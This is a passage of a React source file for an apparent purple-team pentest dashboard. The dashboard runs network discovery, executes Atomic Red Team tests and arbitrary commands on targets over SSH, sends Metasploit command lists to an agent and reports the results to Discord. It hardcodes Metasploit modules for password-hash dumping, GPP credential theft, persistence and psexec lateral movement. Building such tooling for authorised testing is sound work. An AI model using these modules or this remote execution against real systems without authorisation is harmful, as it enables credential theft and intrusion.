'use client'

import { useState, useRef, useEffect, useCallback } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { usePurpleTeamStore } from '@/lib/store'
import type { DiscoveredHost, SuggestedExploit, CredentialedHistoryItem, KillChainStage, AttackVector } from '@/lib/store'
import toast from 'react-hot-toast'
import {
  CommandLineIcon,
  KeyIcon,
  ServerIcon,
  PlayIcon,
  ClockIcon,
  CheckCircleIcon,
  ExclamationCircleIcon,
  DocumentTextIcon,
  ArrowPathIcon,
  GlobeAltIcon,
  SignalIcon,
  ComputerDesktopIcon,
  WifiIcon,
  ChevronDownIcon,
  ChevronUpIcon,
  BoltIcon,
  ShieldExclamationIcon,
  MagnifyingGlassIcon,
  CpuChipIcon,
  StopIcon,
  PaperAirplaneIcon,
  TrashIcon,
  PlusIcon,
  AdjustmentsHorizontalIcon,
  BeakerIcon,
  FunnelIcon,
  CodeBracketIcon,
  XMarkIcon,
} from '@heroicons/react/24/outline'

interface PentestConfig {
  target_ip: string
  target_port: string
  attack_module: string
  lhost: string
  lport: string
  // Credentialed specific
  ssh_host: string
  ssh_user: string
  ssh_password: string
  custom_command: string
  // Selected from discovery
  selected_host_os_type: string
  selected_host_os: string
}

// ‚îÄ‚îÄ Atomic Red Team Types ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
interface ARTTestSummary {
  index: number
  name: string
  guid: string
  description: string
  platforms: string[]
  executor_type: string
  elevation_required: boolean
}

interface ARTTechniqueSummary {
  technique_id: string
  display_name: string
  test_count: number
  platforms: string[]
  tests: ARTTestSummary[]
}

interface ARTTestFull {
  index: number
  name: string
  guid: string
  description: string
  platforms: string[]
  executor_type: string
  command: string
  cleanup_command: string
  elevation_required: boolean
  input_arguments: Record<string, {
    description: string
    type: string
    default: string | number
  }>
}

interface ARTTechniqueFull {
  technique_id: string
  display_name: string
  tests: ARTTestFull[]
}

const TIMING_OPTIONS = [
  { value: 'T1', label: 'T1 ‚Äî Sneaky', desc: 'IDS evasion, very slow', color: 'text-neon-green' },
  { value: 'T2', label: 'T2 ‚Äî Polite', desc: 'Slow, reduced bandwidth', color: 'text-cyber-cyan' },
  { value: 'T3', label: 'T3 ‚Äî Normal', desc: 'Default nmap speed', color: 'text-white' },
  { value: 'T4', label: 'T4 ‚Äî Aggressive', desc: 'Fast (recommended)', color: 'text-neon-yellow' },
  { value: 'T5', label: 'T5 ‚Äî Insane', desc: 'Maximum speed', color: 'text-neon-red' },
]

type AttackTab = 'suggested' | 'custom' | 'metasploit' | 'killchain'

// Post-exploitation modules by OS
const POST_EXPLOITATION_MODULES = {
  linux: [
    { module: 'post/linux/gather/hashdump', name: 'Hashdump', category: 'credential_access' as const },
    { module: 'post/linux/gather/enum_configs', name: 'Enum Configs', category: 'discovery' as const },
    { module: 'post/linux/gather/enum_network', name: 'Enum Network', category: 'discovery' as const },
    { module: 'post/linux/gather/enum_system', name: 'Enum System', category: 'discovery' as const },
    { module: 'post/linux/gather/checkvm', name: 'Check VM', category: 'discovery' as const },
    { module: 'post/linux/gather/enum_users_history', name: 'Enum Users History', category: 'collection' as const },
    { module: 'post/linux/gather/enum_network', name: 'Enum Network', category: 'discovery' as const },
  ],
  windows: [
    { module: 'post/windows/gather/hashdump', name: 'Hashdump', category: 'credential_access' as const },
    { module: 'post/windows/gather/enum_logged_on_users', name: 'Enum Logged On Users', category: 'discovery' as const },
    { module: 'post/windows/gather/enum_domain', name: 'Enum Domain', category: 'discovery' as const },
    { module: 'post/windows/gather/enum_shares', name: 'Enum Shares', category: 'discovery' as const },
    { module: 'post/windows/gather/enum_snmp', name: 'Enum SNMP', category: 'discovery' as const },
    { module: 'post/windows/gather/credentials/gpp', name: 'GPP Passwords', category: 'credential_access' as const },
    { module: 'post/windows/gather/enum_applications', name: 'Enum Applications', category: 'discovery' as const },
  ],
}

const PERSISTENCE_MODULES = {
  linux: [
    { module: 'exploit/linux/local/service_persistence', name: 'Service Persistence', category: 'persistence' as const },
    { module: 'exploit/linux/local/cron_persistence', name: 'Cron Persistence', category: 'persistence' as const },
  ],
  windows: [
    { module: 'exploit/windows/local/persistence', name: 'Registry Persistence', category: 'persistence' as const },
    { module: 'exploit/windows/local/scheduled_task', name: 'Scheduled Task', category: 'persistence' as const },
  ],
}

const LATERAL_MOVEMENT_MODULES = [
  { module: 'exploit/windows/smb/psexec', name: 'PSExec', target: 'windows' },
  { module: 'exploit/windows/smb/smb_delivery', name: 'SMB Delivery', target: 'windows' },
  { module: 'exploit/linux/ssh/ssh_login', name: 'SSH Login', target: 'linux' },
  { module: 'exploit/multi/script/web_delivery', name: 'Web Delivery', target: 'multi' },
]

// Platform filter options for ART techniques
const PLATFORM_FILTERS = [
  { value: '', label: 'ALL', icon: 'üåê' },
  { value: 'linux', label: 'LINUX', icon: 'üêß' },
  { value: 'windows', label: 'WINDOWS', icon: 'ü™ü' },
  { value: 'macos', label: 'MACOS', icon: 'üçé' },
]

export default function PentestPage({ mode }: { mode: 'credentialed' | 'blackbox' }) {
  const {
    n8nConfig, addAttackResult, isLoading, setIsLoading, setLoadingMessage, addNotification,
    agentConfig, networkDiscoveryResult, setNetworkDiscoveryResult,
    isDiscoveryRunning, setIsDiscoveryRunning,
    // Credentialed attack persisted state
    credentialedConfig, updateCredentialedConfig,
    artConsoleOutput, setArtConsoleOutput, appendArtConsoleOutput,
    credentialedHistory, addCredentialedHistoryItem, updateCredentialedHistoryStatus, clearCredentialedHistory,
    // Attack Vectors
    attackVectors, addAttackVector, updateAttackVector, removeAttackVector,
    currentAttackVector, setCurrentAttackVector,
  } = usePurpleTeamStore()

  // Blackbox config (local state ‚Äî only used in blackbox mode)
  const [config, setConfig] = useState<PentestConfig>({
    target_ip: '192.168.204.140',
    target_port: '445',
    attack_module: '',
    lhost: '192.168.204.128',
    lport: '4446',
    ssh_host: '',
    ssh_user: 'root',
    ssh_password: '',
    custom_command: '',
    selected_host_os_type: 'unknown',
    selected_host_os: 'Unknown',
  })

  // Blackbox execution history (local state)
  const [executionHistory, setExecutionHistory] = useState<Array<{
    id: string
    timestamp: string
    status: 'running' | 'success' | 'failed'
    target: string
    module: string
    output?: string
  }>>([])

  const [networkRange, setNetworkRange] = useState('')
  const [timing, setTiming] = useState('T4')
  const [expandedHost, setExpandedHost] = useState<string | null>(null)

  // Attack tab state
  const [attackTab, setAttackTab] = useState<AttackTab>('suggested')
  const [selectedExploit, setSelectedExploit] = useState<SuggestedExploit | null>(null)

  // Kill Chain state
  const [killChain, setKillChain] = useState<KillChainStage>({
    enumeration: { selectedHosts: [] },
    weaponization: { selectedAttacks: [] },
    postExploitation: { osType: 'unknown', selectedModules: [], persistenceAttacks: [] },
    lateralMovement: { selectedModules: [] },
  })
  const [attackVectorName, setAttackVectorName] = useState('')
  const [showSaveDialog, setShowSaveDialog] = useState(false)
  const [killChainOutput, setKillChainOutput] = useState('')
  const [isKillChainRunning, setIsKillChainRunning] = useState(false)
  const killChainTerminalRef = useRef<HTMLDivElement>(null)

  // Custom command terminal
  const [customCmd, setCustomCmd] = useState('')
  const [cmdOutput, setCmdOutput] = useState('')
  const [isCmdRunning, setIsCmdRunning] = useState(false)
  const terminalRef = useRef<HTMLDivElement>(null)

  // Credentialed custom command execution
  const [credCmdOutput, setCredCmdOutput] = useState('')
  const [isCredCmdRunning, setIsCredCmdRunning] = useState(false)
  const credTerminalRef = useRef<HTMLDivElement>(null)

  // Manual Metasploit
  const [msfCommands, setMsfCommands] = useState<string[]>([])
  const [msfNewCmd, setMsfNewCmd] = useState('')
  const [msfOutput, setMsfOutput] = useState('')
  const [isMsfRunning, setIsMsfRunning] = useState(false)
  const msfTerminalRef = useRef<HTMLDivElement>(null)

  // ‚îÄ‚îÄ Atomic Red Team State (selection is local, console+history from store) ‚îÄ‚îÄ
  const [artSearch, setArtSearch] = useState('')
  const [artPlatformFilter, setArtPlatformFilter] = useState('')
  const [artTechniques, setArtTechniques] = useState<ARTTechniqueSummary[]>([])
  const [artLoading, setArtLoading] = useState(false)
  const [artSelectedTechnique, setArtSelectedTechnique] = useState<ARTTechniqueSummary | null>(null)
  const [artSelectedTest, setArtSelectedTest] = useState<ARTTestFull | null>(null)
  const [artTechniqueDetail, setArtTechniqueDetail] = useState<ARTTechniqueFull | null>(null)
  const [artIsRunning, setArtIsRunning] = useState(false)
  const [artShowCleanup, setArtShowCleanup] = useState(false)
  const artConsoleRef = useRef<HTMLDivElement>(null)
  const artSearchDebounceRef = useRef<ReturnType<typeof setTimeout> | null>(null)

  // Auto-scroll terminals
  useEffect(() => {
    if (terminalRef.current) terminalRef.current.scrollTop = terminalRef.current.scrollHeight
  }, [cmdOutput])
  useEffect(() => {
    if (credTerminalRef.current) credTerminalRef.current.scrollTop = credTerminalRef.current.scrollHeight
  }, [credCmdOutput])
  useEffect(() => {
    if (msfTerminalRef.current) msfTerminalRef.current.scrollTop = msfTerminalRef.current.scrollHeight
  }, [msfOutput])
  useEffect(() => {
    if (artConsoleRef.current) artConsoleRef.current.scrollTop = artConsoleRef.current.scrollHeight
  }, [artConsoleOutput])

  // ‚îÄ‚îÄ Load ART techniques on mount & when filters change ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
  const fetchArtTechniques = useCallback(async (search?: string, platform?: string) => {
    setArtLoading(true)
    try {
      const params = new URLSearchParams()
      if (platform) params.set('platform', platform)
      if (search) params.set('search', search)
      const res = await fetch(`/api/atomic-red-team/techniques?${params.toString()}`)
      const data = await res.json()
      if (data.success) {
        setArtTechniques(data.techniques || [])
      }
    } catch {
      console.error('Failed to load ART techniques')
    } finally {
      setArtLoading(false)
    }
  }, [])

  // Debounced search
  useEffect(() => {
    if (mode !== 'credentialed') return
    if (artSearchDebounceRef.current) clearTimeout(artSearchDebounceRef.current)
    artSearchDebounceRef.current = setTimeout(() => {
      fetchArtTechniques(artSearch, artPlatformFilter)
    }, 300)
    return () => { if (artSearchDebounceRef.current) clearTimeout(artSearchDebounceRef.current) }
  }, [artSearch, artPlatformFilter, mode, fetchArtTechniques])

  // Load full technique details when a technique is selected
  const loadTechniqueDetail = useCallback(async (techniqueId: string) => {
    try {
      const res = await fetch(`/api/atomic-red-team/techniques?technique_id=${techniqueId}`)
      const data = await res.json()
      if (data.success && data.technique) {
        setArtTechniqueDetail(data.technique)
      }
    } catch {
      toast.error('Failed to load technique details')
    }
  }, [])

  const handleSelectTechnique = (technique: ARTTechniqueSummary) => {
    if (artSelectedTechnique?.technique_id === technique.technique_id) {
      setArtSelectedTechnique(null)
      setArtTechniqueDetail(null)
      setArtSelectedTest(null)
      return
    }
    setArtSelectedTechnique(technique)
    setArtSelectedTest(null)
    loadTechniqueDetail(technique.technique_id)
  }

  const handleSelectTest = (test: ARTTestFull) => {
    setArtSelectedTest(artSelectedTest?.guid === test.guid ? null : test)
  }

  // ‚îÄ‚îÄ Discord Webhook Notification Helper ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
  const sendDiscordNotification = async (details: {
    attack_type: string
    status: 'success' | 'failure'
    execution_id: string
    target_ip: string
    target_port?: number
    module?: string
    command?: string
    output?: string
    stderr?: string
    exit_code?: number
    os_type?: string
    executor?: string
    extra_fields?: Array<{ name: string; value: string; inline?: boolean }>
  }) => {
    const webhookUrl = n8nConfig.discord_webhook_url
    if (!webhookUrl) return  // silently skip if no webhook configured
    try {
      await fetch('/api/webhook/notification', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          webhook_url: webhookUrl,
          ...details,
          timestamp: new Date().toISOString(),
        }),
      })
    } catch {
      // Don't block attack flow if notification fails
      console.warn('[Discord Notification] Failed to send')
    }
  }

  // ‚îÄ‚îÄ Execute ART Test on Target via SSH (uses persisted credentialedConfig) ‚îÄ‚îÄ
  const executeArtTest = async (runCleanup = false) => {
    if (!artSelectedTest) { toast.error('Select an atomic test first'); return }
    if (!credentialedConfig.ssh_host) { toast.error('SSH Host (target) is required ‚Äî fill it in the CREDENTIALS section'); return }
    if (!credentialedConfig.ssh_user) { toast.error('SSH User is required'); return }
    if (!credentialedConfig.ssh_password) { toast.error('SSH Password is required'); return }

    const command = runCleanup ? artSelectedTest.cleanup_command : artSelectedTest.command
    if (!command.trim()) {
      toast.error(runCleanup ? 'No cleanup command available' : 'No command available for this test')
      return
    }

    const sshHost = credentialedConfig.ssh_host
    const techniqueLabel = `${artSelectedTechnique?.technique_id} - Test #${artSelectedTest.index}`
    setArtIsRunning(true)

    const header = runCleanup
      ? `\n‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó\n‚ïë  üßπ CLEANUP: ${techniqueLabel}\n‚ïë  ${artSelectedTest.name}\n‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù\n`
      : `\n‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó\n‚ïë  üéØ EXECUTING: ${techniqueLabel}\n‚ïë  ${artSelectedTest.name}\n‚ïë  Executor: ${artSelectedTest.executor_type} | Elevation: ${artSelectedTest.elevation_required ? 'YES' : 'NO'}\n‚ïë  Target: ${sshHost}\n‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù\n`

    appendArtConsoleOutput(header)
    appendArtConsoleOutput(`$ ${command.trim().split('\n').join('\n$ ')}\n\n`)

    const execId = `art_${Date.now()}`
    if (!runCleanup) {
      addCredentialedHistoryItem({
        id: execId,
        timestamp: new Date().toISOString(),
        status: 'running',
        target: sshHost,
        module: `${artSelectedTechnique?.technique_id} #${artSelectedTest.index}: ${artSelectedTest.name}`,
      })
    }

    try {
      const res = await fetch('/api/agent/execute-command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ssh_host: sshHost,
          ssh_port: 22,
          ssh_user: credentialedConfig.ssh_user,
          ssh_password: credentialedConfig.ssh_password,
          command: command.trim(),
          timeout: 120000,
        }),
      })

      const result = await res.json()

      if (result.success) {
        appendArtConsoleOutput((result.output || '(no output)') + '\n')
        if (result.stderr) {
          appendArtConsoleOutput(`\n[stderr]\n${result.stderr}\n`)
        }
        appendArtConsoleOutput(`\n[‚úì] Exit code: ${result.exit_code ?? 0} | ${new Date().toLocaleTimeString()}\n`)

        if (!runCleanup) {
          const isSuccess = result.exit_code === 0
          updateCredentialedHistoryStatus(execId, isSuccess ? 'success' : 'failed', result.output)

          addAttackResult({
            execution_id: execId,
            attack_type: 'credentialed',
            timestamp: new Date().toISOString(),
            target_ip: sshHost,
            target_port: 22,
            raw_output: result.output || '',
            success: isSuccess,
            os_type: 'linux',
          })

          // Send Discord notification
          sendDiscordNotification({
            attack_type: 'art_test',
            status: isSuccess ? 'success' : 'failure',
            execution_id: execId,
            target_ip: sshHost,
            target_port: 22,
            module: `${artSelectedTechnique?.technique_id} #${artSelectedTest.index}: ${artSelectedTest.name}`,
            command: command.trim(),
            output: result.output,
            stderr: result.stderr,
            exit_code: result.exit_code ?? 0,
            os_type: 'linux',
            executor: artSelectedTest.executor_type,
            extra_fields: [
              { name: 'üß¨ Technique', value: artSelectedTechnique?.name || 'N/A', inline: true },
              { name: 'üî¨ Test Name', value: artSelectedTest.name, inline: true },
              { name: '‚¨ÜÔ∏è Elevation Required', value: artSelectedTest.elevation_required ? 'YES' : 'NO', inline: true },
            ],
          })

          toast.success(`${artSelectedTechnique?.technique_id} test executed`)
        } else {
          toast.success('Cleanup completed')
        }
      } else {
        appendArtConsoleOutput(`\n[‚úó ERROR] ${result.error}\n`)
        if (!runCleanup) {
          updateCredentialedHistoryStatus(execId, 'failed')
          sendDiscordNotification({
            attack_type: 'art_test',
            status: 'failure',
            execution_id: execId,
            target_ip: sshHost,
            target_port: 22,
            module: `${artSelectedTechnique?.technique_id} #${artSelectedTest.index}: ${artSelectedTest.name}`,
            command: command.trim(),
            output: result.error,
            executor: artSelectedTest.executor_type,
          })
        }
        toast.error('Execution failed')
      }
    } catch (error) {
      appendArtConsoleOutput(`\n[‚úó ERROR] Failed to execute command\n`)
      if (!runCleanup) {
        updateCredentialedHistoryStatus(execId, 'failed')
        sendDiscordNotification({
          attack_type: 'art_test',
          status: 'failure',
          execution_id: execId,
          target_ip: sshHost,
          target_port: 22,
          module: `${artSelectedTechnique?.technique_id} #${artSelectedTest.index}: ${artSelectedTest.name}`,
          command: command.trim(),
          output: error instanceof Error ? error.message : 'Connection failed',
          executor: artSelectedTest.executor_type,
        })
      }
      toast.error('Failed to communicate with target')
    } finally {
      setArtIsRunning(false)
    }
  }

  const handleInputChange = (field: keyof PentestConfig, value: string) => {
    setConfig(prev => ({ ...prev, [field]: value }))
  }

  // Get suggested exploits for the currently selected target
  const getSelectedHostExploits = (): SuggestedExploit[] => {
    if (!networkDiscoveryResult) return []
    const host = networkDiscoveryResult.discovered_hosts.find(h => h.ip === config.target_ip)
    return host?.suggested_exploits || []
  }

  // ‚îÄ‚îÄ Network Discovery ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
  const runNetworkDiscovery = async () => {
    if (!agentConfig.ssh_host || !agentConfig.ssh_user || !agentConfig.ssh_password) {
      toast.error('Agent SSH credentials not configured. Go to Settings ‚Üí Agent Configuration.')
      return
    }

    setIsDiscoveryRunning(true)
    const timingLabel = TIMING_OPTIONS.find(t => t.value === timing)?.label || timing
    toast.loading(`Running network discovery (${timingLabel})...`, { id: 'discovery' })

    try {
      const response = await fetch('/api/agent/network-discovery', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...agentConfig,
          network_range: networkRange || undefined,
          timing,
        }),
      })

      const result = await response.json()

      if (result.success) {
        setNetworkDiscoveryResult(result)

        addNotification({
          id: `notif_${Date.now()}`,
          type: 'success',
          title: 'Network Discovery Complete',
          message: `Found ${result.summary?.total_hosts || 0} hosts, ${result.summary?.total_open_ports || 0} ports, ${result.summary?.total_suggested_exploits || 0} exploit suggestions`,
          timestamp: new Date().toISOString(),
        })

        toast.success(
          `Discovery complete: ${result.summary?.total_hosts || 0} hosts, ${result.summary?.total_suggested_exploits || 0} exploits suggested`,
          { id: 'discovery' }
        )
      } else {
        toast.error(result.error || 'Network discovery failed', { id: 'discovery' })
        addNotification({
          id: `notif_${Date.now()}`,
          type: 'error',
          title: 'Discovery Failed',
          message: result.error || 'Network discovery failed',
          timestamp: new Date().toISOString(),
        })
      }
    } catch (error) {
      toast.error('Failed to communicate with agent', { id: 'discovery' })
    } finally {
      setIsDiscoveryRunning(false)
    }
  }

  // ‚îÄ‚îÄ Select Target (auto-fill ALL config) ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
  const selectTarget = (host: DiscoveredHost) => {
    // Find the most "interesting" port ‚Äî prioritize known exploitable ones
    const interestingPorts = [21, 22, 23, 25, 80, 139, 445, 1099, 1524, 3306, 3632, 5432, 5900, 6667, 8080, 8443]
    let bestPort = host.ports[0]
    for (const p of host.ports) {
      if (interestingPorts.includes(p.port)) {
        bestPort = p
        break
      }
    }

    // LHOST from agent's network info (the attacker machine's IP)
    const agentIp = networkDiscoveryResult?.network_info?.local_ip || agentConfig.ssh_host || config.lhost

    setConfig(prev => ({
      ...prev,
      target_ip: host.ip,
      target_port: bestPort ? String(bestPort.port) : prev.target_port,
      lhost: agentIp,
      lport: '4444',
      selected_host_os_type: host.os_type,
      selected_host_os: host.os,
    }))

    // Auto-select first high-confidence exploit if available
    const exploits = host.suggested_exploits || []
    const highConf = exploits.find(e => e.confidence === 'high')
    if (highConf) {
      setSelectedExploit(highConf)
      setAttackTab('suggested')
    }

    toast.success(`Target: ${host.ip} | ${host.os_type} | ${host.ports.length} ports | LHOST: ${agentIp}`)
  }

  // ‚îÄ‚îÄ Select a port row ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
  const selectPort = (host: DiscoveredHost, port: number) => {
    const agentIp = networkDiscoveryResult?.network_info?.local_ip || agentConfig.ssh_host || config.lhost
    setConfig(prev => ({
      ...prev,
      target_ip: host.ip,
      target_port: String(port),
      lhost: agentIp,
      lport: '4444',
      selected_host_os_type: host.os_type,
      selected_host_os: host.os,
    }))

    // Try to find an exploit for this specific port
    const exploits = host.suggested_exploits || []
    const portExploit = exploits.find(e => e.port === port && e.confidence === 'high')
    if (portExploit) {
      setSelectedExploit(portExploit)
      setAttackTab('suggested')
    }

    toast.success(`Target: ${host.ip}:${port}`)
  }

  // ‚îÄ‚îÄ Execute Custom Command (Blackbox ‚Äî uses agentConfig) ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
  const executeCustomCommand = async () => {
    if (!customCmd.trim()) { toast.error('Enter a command'); return }
    if (!agentConfig.ssh_host) { toast.error('Agent not configured'); return }

    const cmdToRun = customCmd
    setIsCmdRunning(true)
    setCmdOutput(prev => prev + `\n$ ${cmdToRun}\n`)

    try {
      const response = await fetch('/api/agent/execute-command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...agentConfig,
          command: cmdToRun,
          timeout: 120000,
        }),
      })

      const result = await response.json()
      if (result.success) {
        setCmdOutput(prev => prev + (result.output || '(no output)') + '\n')
        if (result.stderr) setCmdOutput(prev => prev + `[stderr] ${result.stderr}\n`)
        sendDiscordNotification({
          attack_type: 'custom_command',
          status: 'success',
          execution_id: `cmd_${Date.now()}`,
          target_ip: agentConfig.ssh_host,
          module: 'Custom Shell Command',
          command: cmdToRun,
          output: result.output,
          stderr: result.stderr,
          exit_code: result.exit_code,
          executor: 'bash',
        })
      } else {
        setCmdOutput(prev => prev + `[ERROR] ${result.error}\n`)
        sendDiscordNotification({
          attack_type: 'custom_command',
          status: 'failure',
          execution_id: `cmd_${Date.now()}`,
          target_ip: agentConfig.ssh_host,
          module: 'Custom Shell Command',
          command: cmdToRun,
          output: result.error,
          executor: 'bash',
        })
      }
    } catch (error) {
      setCmdOutput(prev => prev + `[ERROR] Failed to execute command\n`)
      sendDiscordNotification({
        attack_type: 'custom_command',
        status: 'failure',
        execution_id: `cmd_${Date.now()}`,
        target_ip: agentConfig.ssh_host,
        module: 'Custom Shell Command',
        command: cmdToRun,
        output: error instanceof Error ? error.message : 'Connection failed',
        executor: 'bash',
      })
    } finally {
      setIsCmdRunning(false)
      setCustomCmd('')
    }
  }

  // ‚îÄ‚îÄ Execute Credentialed Custom Command (uses credentialedConfig) ‚îÄ‚îÄ
  const executeCredCustomCommand = async () => {
    const cmd = credentialedConfig.custom_command?.trim()
    if (!cmd) { toast.error('Enter a command'); return }
    if (!credentialedConfig.ssh_host) { toast.error('SSH host not configured'); return }
    if (!credentialedConfig.ssh_password) { toast.error('SSH password required'); return }

    setIsCredCmdRunning(true)
    setCredCmdOutput(prev => prev + `\n$ ${cmd}\n`)

    try {
      const response = await fetch('/api/agent/execute-command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ssh_host: credentialedConfig.ssh_host,
          ssh_port: 22,
          ssh_user: credentialedConfig.ssh_user,
          ssh_password: credentialedConfig.ssh_password,
          command: cmd,
          timeout: 120000,
        }),
      })

      const result = await response.json()
      if (result.success) {
        setCredCmdOutput(prev => prev + (result.output || '(no output)') + '\n')
        if (result.stderr) setCredCmdOutput(prev => prev + `[stderr] ${result.stderr}\n`)
        sendDiscordNotification({
          attack_type: 'custom_command',
          status: 'success',
          execution_id: `credcmd_${Date.now()}`,
          target_ip: credentialedConfig.ssh_host,
          target_port: 22,
          module: 'Credentialed Custom Command',
          command: cmd,
          output: result.output,
          stderr: result.stderr,
          exit_code: result.exit_code,
          executor: 'bash',
          extra_fields: [
            { name: 'üë§ SSH User', value: credentialedConfig.ssh_user, inline: true },
          ],
        })
      } else {
        setCredCmdOutput(prev => prev + `[ERROR] ${result.error}\n`)
        sendDiscordNotification({
          attack_type: 'custom_command',
          status: 'failure',
          execution_id: `credcmd_${Date.now()}`,
          target_ip: credentialedConfig.ssh_host,
          target_port: 22,
          module: 'Credentialed Custom Command',
          command: cmd,
          output: result.error,
          executor: 'bash',
        })
      }
    } catch (error) {
      setCredCmdOutput(prev => prev + `[ERROR] Failed to execute command\n`)
      sendDiscordNotification({
        attack_type: 'custom_command',
        status: 'failure',
        execution_id: `credcmd_${Date.now()}`,
        target_ip: credentialedConfig.ssh_host,
        target_port: 22,
        module: 'Credentialed Custom Command',
        command: cmd,
        output: error instanceof Error ? error.message : 'Connection failed',
        executor: 'bash',
      })
    } finally {
      setIsCredCmdRunning(false)
    }
  }

  // ‚îÄ‚îÄ Execute MSF Commands ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
  const executeMsfCommands = async () => {
    if (msfCommands.length === 0) { toast.error('Add Metasploit commands first'); return }
    if (!agentConfig.ssh_host) { toast.error('Agent not configured'); return }

    const msfCmdList = [...msfCommands]
    setIsMsfRunning(true)
    setMsfOutput(prev => prev + `\n[*] Executing ${msfCmdList.length} MSF command(s)...\n`)
    setMsfOutput(prev => prev + msfCmdList.map((c, i) => `  ${i + 1}. ${c}`).join('\n') + '\n\n')

    try {
      const response = await fetch('/api/agent/execute-command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...agentConfig,
          command: '',
          is_msf: true,
          msf_commands: msfCmdList,
          timeout: 300000,
        }),
      })

      const result = await response.json()
      if (result.success) {
        setMsfOutput(prev => prev + (result.output || '(no output)') + '\n')
        sendDiscordNotification({
          attack_type: 'metasploit',
          status: 'success',
          execution_id: `msf_${Date.now()}`,
          target_ip: config.target_ip || agentConfig.ssh_host,
          target_port: parseInt(config.target_port) || undefined,
          module: msfCmdList.find(c => c.startsWith('use '))?.replace('use ', '') || 'Metasploit RC Script',
          command: msfCmdList.join('\n'),
          output: result.output,
          stderr: result.stderr,
          exit_code: result.exit_code,
